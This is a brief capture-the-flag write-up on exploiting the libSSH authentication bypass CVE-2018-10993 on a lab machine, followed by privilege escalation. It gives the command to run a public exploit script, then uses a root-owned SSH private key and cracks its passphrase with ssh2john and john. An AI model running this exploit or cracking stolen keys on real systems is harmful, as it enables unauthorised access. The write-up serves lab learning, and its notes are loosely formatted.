### vulnerability

CVE-2018-10993 libSSH authentication bypass exploit

The libSSH library has flawed authentication/connection state-machine.
Upon receiving from connecting client the MSG_USERAUTH_SUCCESS Message
(as described in RFC4252, sec. 5.1.) which is an authentication response message
that should be returned by the server itself (not accepted from client)
the libSSH switches to successful post-authentication state. In such state,
it impersonates connecting client as server's root user and begins executing
delivered commands. 
This results in opening an authenticated remote-access channel
without any authentication attempts (authentication bypass).


### Exploit 

from hint i understood it server side include.

[CVE-2018-10993](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d)


```

python3 cve-2018-10993.py  10.0.100.34  -p 6022 -c 'whoami' 

    :: CVE-2018-10993 libSSH authentication bypass exploit.

### Privilege escalation


```


ls -la
total 20
drwxr-xr-x 1 ETSCTF root     4096 May 18 07:11 .
drwxr-xr-x 1 ETSCTF www-data 4096 Nov 11  2019 ..
-rw-r--r-- 1 ETSCTF www-data  222 May 18 07:11 known_hosts
-rw------- 1 ETSCTF root     1766 Nov 11  2019 mykey
-rw------- 1 ETSCTF root      399 Nov 11  2019 mykey.pub

```

mykey is owned by root. 


next we can see thet machine is listen - 127.0.0.1:22 --- ssh port 
```


ssh -p 22 -i ~/.ssh/mykey root@127.0.0.1

and i got password for this key :(

there two options to solve this:

1. enumration  -- found the pass from clues in machine description (OkilyDokily)
2. ssh2john 


using ssh2john

python ~/tools/ssh2john.py key > new_key 

and then brutfouce the new_key

$ john new_key

```
